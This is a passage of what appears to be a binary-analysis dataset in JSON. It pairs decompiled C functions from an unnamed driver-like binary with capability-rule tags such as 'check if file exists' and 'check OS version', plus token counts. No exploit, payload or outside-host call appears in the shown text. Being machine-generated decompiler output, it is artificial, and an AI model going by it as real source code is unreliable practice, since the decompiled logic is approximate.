        "decompiled_code": "\nint32_t * fcn.000212f4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *arg1_00;\n    int64_t in_stack_00000028;\n    int64_t iStack72;\n    uchar auStack64 [32];\n    \n    if (in_stack_00000028 == 0) {\n        piVar2 = 0xffffffff;\n    }\n    else {\n        piVar2 = fcn.00020640(&iStack72, arg1, 0, auStack64);\n        if (piVar2 == 0) {\n            if ((*(iStack72 + 0x90) != 0) && (arg2 == *(iStack72 + 0x94))) {\n                arg2._0_4_ = *(iStack72 + 0x98);\n            }\n            for (piVar2 = *(iStack72 + 0x38);\n                (arg1_00 = NULL,  piVar2 != NULL && ((*piVar2 != arg2 || (arg1_00 = piVar2,  piVar2[1] != arg3))));\n                piVar2 = *(piVar2 + 8)) {\n            }\n            iVar1 = fcn.00020000(arg1_00, arg4);\n            if (iVar1 == -1) {\n                piVar2 = 0x5;\n            }\n            else {\n                iVar1 = (**(*(iStack72 + 0x58) + 0x28))(*(iStack72 + 0x60), in_stack_00000028, 0x40, iVar1);\n                piVar2 = NULL;\n                if (iVar1 == -1) {\n                    piVar2 = 0x3;\n                }\n            }\n            fcn.0001feb8(auStack64);\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 425
    },
    "000217f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000217f8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_fffffffffffffff0;\n    ulong in_stack_fffffffffffffff8;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021498(*0x64290, arg1, arg2, arg3, arg4, in_stack_fffffffffffffff0, in_stack_fffffffffffffff8, \n                             in_stack_00000000, in_stack_00000008, in_stack_00000010, in_stack_00000018, \n                             in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                             in_stack_00000040, in_stack_00000048, in_stack_00000050);\n    }\n    return uVar1;\n}\n",
        "token_count": 312
    },
    "00021828": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021828(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000213c0(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00021858": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021858(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000212f4(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00021888": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021888(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000211a0(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "000218cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000218cc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.0002105c(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0002191c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0002191c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00020d04(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "00021948": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021948(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00020dc8(*0x64290, arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "00021974": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021974(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00020edc(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "000219b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000219b0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00020b24(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "000219dc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000219dc(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00020c04(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00021aa0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021aa0(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021694(*0x64290, arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 84
    },
    "00021da8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021da8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021ccc(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "00021dec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00021dec(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021b00(*0x64290, arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "000222d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.000222d0(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x64290 == 0xffffffff) {\n        iVar2 = fcn.00021e34(arg1, arg2, 0x64290, *0x64298);\n        if (iVar2 == 0) {\n            iVar1 = *(*0x64290 * 8 + 0x88cd0);\n            *0x7a2c0 = iVar1 + 8;\n            *0x7a2c8 = *(iVar1 + 0x38);\n        }\n        else {\n            *0x64290 = 0xffffffff;\n        }\n    }\n    else {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 181
    },
    "000250dc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000250dc(int64_t *arg1, uint32_t *arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    int64_t arg3_00;\n    uchar auStack56 [16];\n    \n    *arg3 = 0;\n    iVar1 = fcn.000265bc(auStack56, 0x10, 0x228);\n    if (iVar1 == 0) {\n        uVar2 = fcn.0001f8d8(auStack56, 0x10, *arg1, *arg2);\n        if (uVar2 == 0xffffffff) {\n            uVar3 = 0x215901fa;\n        }\n        else {\n            arg3_00 = fcn.0002fbc4(uVar2);\n            if (arg3_00 == 0) {\n                uVar3 = 0x21590004;\n            }\n            else {\n                fcn.0001f900(auStack56, 0x10, arg3_00, *arg1);\n                *arg1 = arg3_00;\n                *arg2 = uVar2;\n                *arg3 = arg3_00;\n                uVar3 = 0;\n            }\n        }\n    }\n    else {\n        uVar3 = 0x215901f9;\n    }\n    return uVar3;\n}\n",
        "token_count": 315
    },
    "00028b70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00028b70(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    int64_t arg1_01;\n    uint64_t uVar3;\n    uint64_t arg1_02;\n    uchar auStack88 [20];\n    uint32_t uStack68;\n    \n    arg1_01 = 0;\n    arg1_00 = fcn.000305c4(arg1, 0x11ea0);\n    if (arg1_00 != 0) {\n        uVar1 = fcn.0002ff60(arg1_00);\n        iVar2 = fcn.00030094(uVar1, auStack88);\n        if (iVar2 != -1) {\n            arg1_02 = uStack68;\n            arg1_01 = fcn.0002fbc4(arg1_02);\n            if (arg1_01 == 0) {\n                uVar1 = 0x21590004;\n                goto code_r0x00028c27;\n            }\n            uVar3 = fcn.0002fee4(arg1_01, 1, arg1_02, arg1_00);\n            if (uVar3 == arg1_02) {\n                iVar2 = fcn.000268d0(3, arg2, arg1_01, uStack68);\n                if (iVar2 == 0) {\n                    uVar1 = 0;\n                }\n                else {\n                    uVar1 = iVar2 + 0x191U | 0x21590000;\n                }\n                goto code_r0x00028c27;\n            }\n        }\n    }\n    uVar1 = fcn.0002fde4();\ncode_r0x00028c27:\n    fcn.0002fc50(arg1_01);\n    if (arg1_00 != 0) {\n        fcn.0002fe58(arg1_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 445
    },
    "00030094": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00030094(ulong arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    fcn.00061a56(arg2, 0, 0x30);\n    iVar1 = fcn.0002ff64(arg1);\n    *(arg2 + 0x14) = iVar1;\n    return (iVar1 != -1) - 1;\n}\n",
        "token_count": 91
    },
    "00030924": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.00030924(ulong noname_0, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    ulong in_R8;\n    ulong in_R9;\n    \n    uVar1 = fcn.000308b8(noname_0, 0, in_R8, in_R9);\n    if (uVar1 == 0xffffffff) {\n        uVar3 = uVar1 & 0xffffffff;\n    }\n    else {\n        fcn.00061a56(arg2, 0, 0x30);\n        uVar2 = fcn.0002ff64(uVar1);\n        *(arg2 + 0x14) = uVar2;\n        fcn.000619de(uVar1);\n        uVar3 = (*(arg2 + 0x14) != -1) - 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 209
    },
    "00030d38": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.00030d38(ulong noname_0, int64_t arg2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    int16_t *piVar7;\n    ulong in_R8;\n    ulong in_R9;\n    uchar auStack56 [24];\n    \n    iVar3 = fcn.000308b8(noname_0, 0, in_R8, in_R9);\n    if (iVar3 != -1) {\n        puVar4 = fcn.0001c698(1, 0x220, 0x7346744e);\n        if (puVar4 == NULL) {\n            fcn.000619de();\n            uVar6 = 0xc;\n        }\n        else {\n            *puVar4 = 0;\n            *(puVar4 + 8) = 0;\n            iVar5 = fcn.00061b04(arg2, 0x5c);\n            if (iVar5 != 0) {\n                arg2 = iVar5 + 1;\n            }\n            fcn.00031740(arg2, puVar4 + 0x14, 0x104);\n            iVar5 = -1;\n            piVar7 = puVar4 + 0x14;\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            iVar2 = ~iVar5 * 2;\n            *(puVar4 + 0x10) = iVar2 + -2;\n            iVar3 = fcn.00061a1a(iVar3, auStack56, puVar4, iVar2 + 0x16, 10);\n            fcn.000619de();\n            if (iVar3 == 0) {\n                return 0;\n            }\n            uVar6 = fcn.00061a5c();\n        }\n        fcn.0002fd3c(uVar6);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 484
    },
    "0004a418": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0004a418(ulong arg1, ulong arg2, int64_t arg3, int64_t *arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int16_t *arg1_00;\n    int64_t arg2_00;\n    uint64_t uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    int16_t *piVar8;\n    int64_t *arg4_00;\n    char acStackX32 [8];\n    uint32_t *in_stack_00000028;\n    ulong auStack88 [3];\n    \n    arg1_00 = NULL;\n    arg2_00 = 0;\n    auStack88[0] = 0;\n    *arg4 = 0;\n    arg4_00 = arg4;\n    uVar2 = fcn.00030744(arg2, 0x8000, 0, arg4);\n    if (uVar2 == 0xffffffff) {\n        arg1_00 = fcn.0002fbc4(0x208);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        iVar3 = fcn.0002f598(arg1_00, 0x104);\n        if (iVar3 == 0) {\n            if (arg1 == 0) {\n                acStackX32[0] = '\\0';\n            }\n            else {\n                iVar3 = fcn.00049f40(auStack88, 0x400, arg1);\n                if ((iVar3 != 0) || (iVar3 = fcn.00049d34(0xffffffffffffffff, acStackX32),  iVar3 != 0))\n                goto code_r0x0004a567;\n            }\n            uVar5 = 0xffffffffffffffff;\n            uVar7 = 0x15d20;\n            piVar8 = arg1_00;\n            if (acStackX32[0] != '\\0') {\n                uVar7 = 0x15d08;\n            }\n            do {\n                if (uVar5 == 0) break;\n                uVar5 = uVar5 - 1;\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            fcn.00061ab0(arg1_00, uVar7, 0x104 - (~uVar5 - 1));\n            iVar6 = -1;\n            piVar8 = arg1_00;\n            do {\n                if (iVar6 == 0) break;\n                iVar6 = iVar6 + -1;\n                iVar1 = *piVar8;\n                piVar8 = piVar8 + 1;\n            } while (iVar1 != 0);\n            fcn.00061ab0(arg1_00);\n            arg1_00[0x103] = 0;\n            uVar2 = fcn.00030744(arg1_00, 0, 0, arg4_00);\n            if (uVar2 != 0xffffffff) goto code_r0x0004a5bf;\n            iVar3 = 0x21590005;\n            arg2_00 = 0;\n        }\n    }\n    else {\ncode_r0x0004a5bf:\n        uVar4 = fcn.0002ff64(uVar2);\n        if (uVar4 == 0xffffffff) {\ncode_r0x0004a5cd:\n            iVar3 = -1;\n        }\n        else {\n            arg2_00 = fcn.0002fbc4(uVar4);\n            if (arg2_00 != 0) {\n                iVar3 = fcn.0002ffb4(uVar2, arg2_00, uVar4);\n                if (iVar3 == -1) goto code_r0x0004a5cd;\n                uVar4 = fcn.0004a1ec(arg2_00);\n                iVar6 = fcn.0002fbc4(uVar4);\n                *arg4 = iVar6;\n                if (iVar6 != 0) {\n                    iVar3 = fcn.0004a25c(iVar6, arg2_00);\n                    if (iVar3 == 0) {\n                        if (arg3 == 0) {\n                            arg3 = *arg4;\n                        }\n                        iVar3 = fcn.0004a104(*arg4, arg3);\n                        if (iVar3 == 0) {\n                            if (in_stack_00000028 != NULL) {\n                                *in_stack_00000028 = uVar4;\n                            }\n                            goto code_r0x0004a57f;\n                        }\n                    }\n                    goto code_r0x0004a567;\n                }\n            }\n            iVar3 = 0x21590004;\n        }\n    }\ncode_r0x0004a567:\n    fcn.0002fc50(*arg4);\n    *arg4 = 0;\ncode_r0x0004a57f:\n    fcn.0002fc50(arg2_00);\n    fcn.000619de(auStack88[0]);\n    fcn.0002fc50(arg1_00);\n    if (uVar2 != 0xffffffff) {\n        fcn.0002ffa0(uVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 1184
    },
    "0004e130": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0004e130(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int64_t arg2_00;\n    int64_t iVar3;\n    int64_t *in_stack_00000028;\n    int32_t aiStack72 [2];\n    int64_t iStack64;\n    \n    iStack64 = 0;\n    puVar2 = fcn.00061b04(arg3, 0x2e);\n    if (puVar2 == NULL) {\n        iVar1 = 0x2159000d;\n    }\n    else {\n        *puVar2 = 0;\n        arg2_00 = fcn.0002fbc4(0x20a);\n        if (arg2_00 == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            aiStack72[0] = 0;\n            while (iVar3 = fcn.00061be8(arg2_00, arg3, 0x104),  iVar3 != -1) {\n                *(arg2_00 + iVar3 * 2) = 0;\n                iVar1 = fcn.0004a77c(arg1, arg2_00, 0x20a, aiStack72);\n                if (((iVar1 != 0) || (iVar1 = fcn.0004de80(arg1, arg2_00, &iStack64),  iVar1 != 0)) ||\n                   ((iStack64 != arg2 && (iVar1 = fcn.0004e6ac(arg1, iStack64, puVar2 + 1, arg4),  iVar1 == 0))))\n                goto code_r0x0004e228;\n                if (aiStack72[0] == -1) {\n                    iVar1 = 0x2159000d;\n                    goto code_r0x0004e228;\n                }\n                fcn.0004ee74(arg1, iStack64);\n            }\n            iVar1 = 0x21590066;\ncode_r0x0004e228:\n            fcn.0002fc50(arg2_00);\n            if (iVar1 == 0) {\n                *in_stack_00000028 = iStack64;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 519
    },
    "000583fc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.000583fc(int64_t arg1, uint64_t arg2, uint64_t *arg3, uint64_t **arg4)\n\n{\n    char cVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t *arg2_00;\n    uint64_t *puVar7;\n    ulong arg2_01;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    int64_t arg1_00;\n    int32_t iVar10;\n    int32_t aiStackX16 [4];\n    uint64_t **ppuStackX32;\n    uint64_t *in_stack_00000028;\n    \n    uVar9 = 0;\n    ppuStackX32 = arg4;\n    if (arg2 != 0) {\n        do {\n            iVar5 = fcn.00061bb8(uVar9 + arg1, 0xd);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            if (*(iVar5 + 1) != '\\n') {\n                return 0;\n            }\n            iVar10 = iVar5 - arg1;\n            if (iVar10 == uVar9) {\n                return 0;\n            }\n            arg2_01 = 0x3a;\n            iVar6 = fcn.00061bb8(uVar9 + arg1);\n            if (iVar6 == 0) {\n                return 0;\n            }\n            if (*(iVar6 + 1) != ' ') {\n                return 0;\n            }\n            arg1_00 = iVar6 + 2;\n            uVar8 = iVar5 - arg1_00;\n            if (uVar8 < 0x1e) {\ncode_r0x000584ca:\n                if ((0x11 < uVar8) && ((iVar3 = fcn.00031a34(arg1_00, arg2_01),  iVar3 != 0 && (*0x78214 != 0)))) {\n                    iVar6 = iVar6 + 0xc;\n                    uVar8 = uVar8 - 10;\n                    goto code_r0x000584f2;\n                }\n            }\n            else {\n                arg2_01 = 0x16;\n                iVar3 = fcn.00031940(arg1_00, 0x16, aiStackX16);\n                if ((iVar3 == 0) || (aiStackX16[0] != *0x66200)) goto code_r0x000584ca;\n                iVar6 = iVar6 + 0x18;\n                uVar8 = uVar8 - 0x16;\ncode_r0x000584f2:\n                arg2_00 = fcn.0002fbf0(uVar8);\n                if (arg2_00 == NULL) {\n                    return 0;\n                }\n                uVar8 = fcn.0002f058(iVar6, arg2_00, uVar8);\n                if ((uVar8 != 0xffffffff) && (7 < uVar8)) {\n                    uVar9 = *arg2_00;\n                    *arg3 = uVar9;\n                    uVar4 = fcn.0002fcf4(uVar9 & 0xffffffff);\n                    *arg3 = uVar4;\n                    uVar2 = fcn.0002fd20(*(arg3 + 4));\n                    *(arg3 + 4) = uVar2;\n                    cVar1 = '\\0';\n                    iVar5 = 7;\n                    puVar7 = arg3;\n                    do {\n                        cVar1 = cVar1 + *puVar7;\n                        puVar7 = puVar7 + 1;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                    if (*(arg3 + 7) == cVar1) {\n                        *ppuStackX32 = arg2_00;\n                        *in_stack_00000028 = uVar8;\n                        return 1;\n                    }\n                }\n                fcn.0002fc50(arg2_00);\n            }\n            uVar9 = iVar10 + 2;\n        } while (uVar9 < arg2);\n    }\n    return 0;\n}\n",
        "token_count": 926
    },
    "0005c760": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.0005c760(int64_t arg1, int64_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    char *pcVar9;\n    ulong uStackX16;\n    uint32_t *puStackX24;\n    uint32_t uStackX32;\n    int32_t *piVar10;\n    uint64_t uVar11;\n    uint64_t in_stack_ffffffffffffff90;\n    int32_t aiStack88 [2];\n    int32_t iStack80;\n    uchar auStack72 [12];\n    uint32_t uStack60;\n    \n    uVar11 = arg4;\n    *arg2 = 0;\n    if (*(arg1 + 0x28) == 0) {\n        return 0x21590065;\n    }\n    iVar7 = *(arg1 + 0x68);\n    *(arg1 + 0x68) = 0;\n    puStackX24 = arg3;\n    uStackX32 = arg4;\n    if (iVar7 != 0) {\n        iVar7 = -1;\n        pcVar9 = *(arg1 + 0x70);\n        do {\n            if (iVar7 == 0) break;\n            iVar7 = iVar7 + -1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = fcn.0005c620(arg1, *(arg1 + 0x70), ~iVar7);\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        uVar11 = uStackX32;\n    }\n    iVar7 = *(arg1 + 0x50);\n    *(arg1 + 0x50) = 0;\n    iVar2 = *0xfffff78000000320;\n    if ((iVar7 != 0) &&\n       (uVar6 = fcn.0005c760(arg1, arg1 + 0x58, arg1 + 0x60, uVar11),  iVar2 = *0xfffff78000000320,  uVar6 != 0)) {\n        return uVar6;\n    }\n    while( true ) {\n        piVar10 = aiStack88;\n        in_stack_ffffffffffffff90 = in_stack_ffffffffffffff90 & 0xffffffff00000000;\n        uVar11 = 0;\n        iVar3 = fcn.00061c24(*(arg1 + 0x28), 0, 0, 0, piVar10, 0x11400c, 0, in_stack_ffffffffffffff90, auStack72, 0x14);\n        if ((iVar3 == 0x103) && (iVar4 = fcn.00061aa4(*(arg1 + 0x28), 0, 0),  iVar3 = aiStack88[0],  iVar4 != 0))\n        goto code_r0x0005c8fc;\n        iVar7 = *0xfffff78000000320;\n        if ((iVar3 != 0) && (iVar3 != -0x7ffffffb)) break;\n        if (uStack60 != 0) {\n            iVar7 = fcn.0002fbc4(uStack60);\n            *arg2 = iVar7;\n            if (iVar7 == 0) {\n                return 0x21590004;\n            }\n            *puStackX24 = uStack60;\n            iVar4 = fcn.00061ae6(&uStackX16, 0x10000000, 0, 1, piVar10 & 0xffffffffffffff00);\n            if (iVar4 != 0) {\n                fcn.0002fc50(*arg2);\n                *arg2 = 0;\n                *puStackX24 = 0;\n                goto code_r0x0005c8fc;\n            }\n            uVar8 = 0;\n            if (uStack60 != 0) goto code_r0x0005c9af;\n            goto code_r0x0005ca2d;\n        }\n        if ((uStackX32 != 0xffffffff) && (uVar5 = (**0x112f0)(),  uStackX32 < (uVar5 * (iVar7 - iVar2)) / 10000)) {\n            return 0x21590002;\n        }\n        (**0x115e0)(0);\n    }\n    if (*(arg1 + 0x30) != '\\0') {\n        return 0x21590006;\n    }\n    if (iVar3 == -0x3ffffeb5) {\n        return 0x21590003;\n    }\n    iVar4 = iVar3;\n    if (iVar3 == -0x3fffff50) {\n        return 0x21590003;\n    }\ncode_r0x0005c8fc:\n    uVar6 = fcn.00061a5c(iVar4);\n    return uVar6;\ncode_r0x0005c9af:\n    uVar11 = uVar11 & 0xffffffff00000000 | uStack60 - uVar8;\n    iVar4 = fcn.00061aaa(*(arg1 + 0x28), uStackX16, 0, 0, aiStack88, uVar8 + *arg2, uVar11, 0, 0);\n    if ((iVar4 == 0x103) && (iVar3 = fcn.00061aa4(uStackX16, 0),  iVar4 = aiStack88[0],  iVar3 != 0)) {\n        fcn.0002fc50(*arg2);\n        *arg2 = 0;\n        *puStackX24 = 0;\n        fcn.000619de(uStackX16);\n        iVar4 = iVar3;\n        goto code_r0x0005c8fc;\n    }\n    if (iVar4 != 0) {\n        fcn.0002fc50(*arg2);\n        *arg2 = 0;\n        *puStackX24 = 0;\n        fcn.000619de(uStackX16);\n        if (*(arg1 + 0x30) != '\\0') {\n            return 0x21590006;\n        }\n        if ((iVar4 == -0x3fffff50) || (iVar4 == -0x3fffff4f)) {\n            return 0x21590003;\n        }\n        goto code_r0x0005c8fc;\n    }\n    uVar5 = uVar8 + iStack80;\n    uVar8 = uVar5;\n    if (uStack60 <= uVar5) {\ncode_r0x0005ca2d:\n        fcn.000619de(uStackX16);\n        return 0;\n    }\n    goto code_r0x0005c9af;\n}\n",
        "token_count": 1547
    },
    "000618b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.000618b0(int64_t arg1, ulong arg2, int32_t *arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t aiStackX8 [4];\n    uchar auStack88 [40];\n    \n    bVar2 = false;\n    (*_fcn.00011600)(auStack88, 0, 0);\n    *(arg1 + 0x48) = arg3;\n    *(arg1 + 0x50) = auStack88;\n    if (arg4 != -1) {\n        iVar1 = *(arg1 + 0xb8);\n        *(iVar1 + -0x10) = 0x61748;\n        *(iVar1 + -0x45) = 0xe0;\n        *(iVar1 + -8) = auStack88;\n    }\n    iVar3 = (**0x11108)(arg2);\n    if (iVar3 == 0x103) {\n        if (arg4 != -1) {\n            aiStackX8[0] = arg4 * -10000;\n            iVar4 = (*_fcn.00011628)(auStack88, 0, 0, 0, aiStackX8);\n            if (iVar4 == 0x102) {\n                bVar2 = true;\n                (**0x114c0)(arg1);\n                (*_fcn.00011628)(auStack88, 0, 0, 0, 0);\n            }\n            goto code_r0x00061999;\n        }\n        (*_fcn.00011628)();\n    }\n    else {\ncode_r0x00061999:\n        if (arg4 != -1) {\n            (**0x11588)(arg1, 0);\n        }\n        if (iVar3 != 0x103) goto code_r0x000619b5;\n    }\n    iVar3 = *arg3;\ncode_r0x000619b5:\n    if (bVar2) {\n        iVar3 = 0x102;\n    }\n    return iVar3;\n}\n",
        "token_count": 468
    },
    "00022504": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
